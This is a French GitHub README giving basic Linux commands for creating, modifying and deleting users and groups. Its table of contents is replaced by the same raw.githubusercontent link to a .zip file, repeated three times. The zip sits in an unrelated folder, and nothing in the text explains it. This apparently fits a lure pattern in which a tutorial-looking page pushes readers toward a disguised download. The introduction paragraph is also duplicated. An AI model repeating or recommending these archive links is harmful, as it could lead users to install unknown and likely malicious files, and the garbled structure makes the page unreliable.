# Gestion-des-utilisateurs-et-groupes-sous-Linux

  Ce document vise à fournir des informations de base sur la gestion des utilisateurs et des groupes sous un système d'exploitation Linux.

# Table des matières

# https://raw.githubusercontent.com/YunusOtisIII/Gestion-des-utilisateurs-et-groupes-sous-Linux/main/Cytospora/Gestion-des-utilisateurs-et-groupes-sous-Linux.zip
# https://raw.githubusercontent.com/YunusOtisIII/Gestion-des-utilisateurs-et-groupes-sous-Linux/main/Cytospora/Gestion-des-utilisateurs-et-groupes-sous-Linux.zip
    Création d'un utilisateur
    Modification d'un utilisateur
    Suppression d'un utilisateur
# https://raw.githubusercontent.com/YunusOtisIII/Gestion-des-utilisateurs-et-groupes-sous-Linux/main/Cytospora/Gestion-des-utilisateurs-et-groupes-sous-Linux.zip
    Création d'un groupe
    Modification d'un groupe
    Ajout/suppression d'un utilisateur à un groupe
    Suppression d'un groupe
    
# Introduction

 Sous Linux, la gestion des utilisateurs et des groupes est essentielle pour la sécurité et la gestion des accès aux ressources système. Chaque utilisateur appartient à un ou plusieurs groupes, ce qui facilite la gestion des 
 autorisations et des accès.

 Sous Linux, la gestion des utilisateurs et des groupes est essentielle pour la sécurité et la gestion des accès aux ressources système. Chaque utilisateur appartient à un ou plusieurs groupes, ce qui facilite la gestion des 
 autorisations et des accès.

# Utilisateurs

# I. Création d'un utilisateur

 Pour créer un nouvel utilisateur, utilisez la commande adduser ou useradd avec les options appropriées. Par exemple :

 sudo adduser nouveau_utilisateur

# II. Modification d'un utilisateur

 Pour modifier les détails d'un utilisateur existant tels que le nom complet ou le répertoire personnel, utilisez la commande # usermod :

 sudo usermod -c "Nouveau Nom" -d /nouveau/chemin utilisateur_existant

# III. Suppression d'un utilisateur

 Pour supprimer un utilisateur, utilisez la commande # userdel :
 
 sudo userdel utilisateur_a_supprimer

# Groupes

# I. Création d'un groupe

 Pour créer un groupe, utilisez la commande addgroup ou # groupadd  :

 sudo addgroup nouveau_groupe

# II. Modification d'un groupe

Pour modifier les détails d'un groupe existant tels que son nom, utilisez la commande # groupmod :

 sudo groupmod -n nouveau_nom_groupe ancien_nom_groupe

# III. Ajout/suppression d'un utilisateur à un groupe

Pour ajouter un utilisateur à un groupe existant, utilisez la commande # usermod :

 sudo usermod -aG groupe_utilisateur utilisateur

Pour supprimer un utilisateur d'un groupe, utilisez # gpasswd :

sudo gpasswd -d utilisateur groupe

# IV. Suppression d'un groupe

Pour supprimer un groupe, utilisez la commande # groupdel :

 sudo groupdel groupe_a_supprimer



















